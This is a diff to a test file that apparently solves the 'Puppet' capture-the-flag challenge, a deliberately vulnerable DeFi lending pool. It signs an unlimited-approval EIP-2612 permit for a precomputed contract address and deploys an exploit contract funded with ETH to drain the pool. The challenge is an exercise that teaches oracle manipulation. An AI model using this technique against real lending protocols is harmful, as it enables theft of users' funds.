@@ -95,6 +95,64 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Generate EIP2612 permit signature
+        const create1Address = ethers.utils.getContractAddress({
+            from: await player.getAddress(),
+            nonce: await ethers.provider.getTransactionCount(await player.getAddress())
+        });
+    
+        let name = await token.name();
+        let version = "1";
+        let nonce = await token.nonces(await player.getAddress());
+        let { chainId } = await ethers.provider.getNetwork();
+
+        let domain = {
+          name: name,
+          version: version,
+          chainId: ethers.utils.hexZeroPad(ethers.BigNumber.from(chainId).toHexString(), 32),
+          verifyingContract: token.address,
+        };
+        let types = {
+          Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" },
+          ],
+        };
+        let value = {
+          owner: await player.getAddress(),
+          spender: create1Address,
+          value: ethers.constants.MaxUint256,
+          nonce: nonce,
+          deadline: "1000000000000000",
+        };
+
+        const populated = await ethers.utils._TypedDataEncoder.resolveNames(domain, types, value, name => {
+          return walletProvider.resolveName(name);
+        });
+
+        let payload = ethers.utils._TypedDataEncoder.getPayload(populated.domain, types, populated.value);
+
+        payload.types.EIP712Domain = [
+          { name: "name", type: "string" },
+          { name: "version", type: "string" },
+          { name: "chainId", type: "uint256" },
+          { name: "verifyingContract", type: "address" },
+        ];
+
+        let signature = await ethers.provider.send("eth_signTypedData_v4", [
+          (await player.getAddress()).toLowerCase(),
+          JSON.stringify(payload),
+        ]);
+
+        // Deploy and run exploit
+        await (await ethers.getContractFactory('PuppetPoolExploit', player)).deploy(
+            uniswapExchange.address,
+            lendingPool.address, signature,
+            {value: ethers.utils.parseEther("24.8")}
+        );
     });
 
     after(async function () {
